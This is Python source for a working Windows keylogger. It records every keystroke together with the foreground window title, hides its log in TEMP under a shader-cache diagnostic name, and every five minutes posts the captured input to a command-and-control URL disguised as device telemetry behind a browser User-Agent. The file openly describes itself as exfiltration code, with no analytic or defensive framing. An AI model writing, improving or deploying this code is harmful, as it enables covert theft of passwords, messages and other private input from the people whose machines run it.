import logging
import time
import threading
import queue
import requests
import win32gui
import os
from pynput import keyboard

# Example: C:\%USERS%\User\Appdata\Local\Temp\D3D_ShaderCache_Diag.log
LOG_FILE = os.path.join(os.getenv('TEMP'), "D3D_ShaderCache_Diag.log")
C2_URL = "http://10.0.0.50:8080/api/v1/telemetry"
EXFIL_INTERVAL = 300

# Standard local logging
# Use force=True to ensure the logger resets properly if you've been testing
logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format='%(asctime)s: %(message)s', force=True)

# Thread safe queue and locks for concurrency
exfil_queue = queue.Queue()
buffer_lock = threading.Lock()
current_window = ""
input_buffer = ""
current_hwnd = None

def get_window_info():
    """Returns the unique Handle and the verbose Title of the active window."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(hwnd)
        # We no longer strip the File Explorer path to ensure full directory visibility
        return hwnd, title
    except Exception:
        return None, "Unknown_Window"

def exfiltrate_data():
    """Periodic exfiltration with a safety flush of the current buffer."""
    while True:
        # Wait for the interval
        time.sleep(EXFIL_INTERVAL)

        # FORCE a flush of the buffer even if no Enter/Window change occurred
        # This ensures 'idle' data is still captured and sent
        flush_buffer()

        if exfil_queue.empty():
            continue

        payload_data = ""
        while not exfil_queue.empty():
            try:
                payload_data += exfil_queue.get_nowait() + "\n"
            except queue.Empty:
                break

        payload = {
            "device_status": "active",
            "telemetry_data": payload_data
        }

        try:
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            requests.post(C2_URL, json=payload, headers=headers, timeout=5)
        except Exception:
            # If the network fails, the data stays in the host's local .log as a fallback
            pass

def flush_buffer():
    """Thread-safe write to log and queue."""
    global input_buffer, current_window
    with buffer_lock:
        if not input_buffer:
            return

        log_entry = f"[{current_window}] Input: {input_buffer}"
        logging.info(log_entry)
        exfil_queue.put(log_entry)
        input_buffer = ""

def on_press(key):
    global current_hwnd, current_window, input_buffer
    new_hwnd, new_title = get_window_info()

    # Context Switch: Flush if the Window Handle (HWND) changes
    if new_hwnd != current_hwnd:
        if input_buffer:
            flush_buffer()
        current_hwnd = new_hwnd
        current_window = new_title

    with buffer_lock:
        try:
            input_buffer += key.char
        except AttributeError:
            if key == keyboard.Key.enter:
                # Append the explicit tag before flushing
                input_buffer += " <enter>"
                # Flush immediately on Enter so the C2 gets the full command
                threading.Thread(target=flush_buffer).start()
            elif key == keyboard.Key.space:
                input_buffer += " "
            elif key == keyboard.Key.backspace:
                input_buffer = input_buffer[:-1]

def main():
    exfil_thread = threading.Thread(target=exfiltrate_data, daemon=True)
    exfil_thread.start()

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()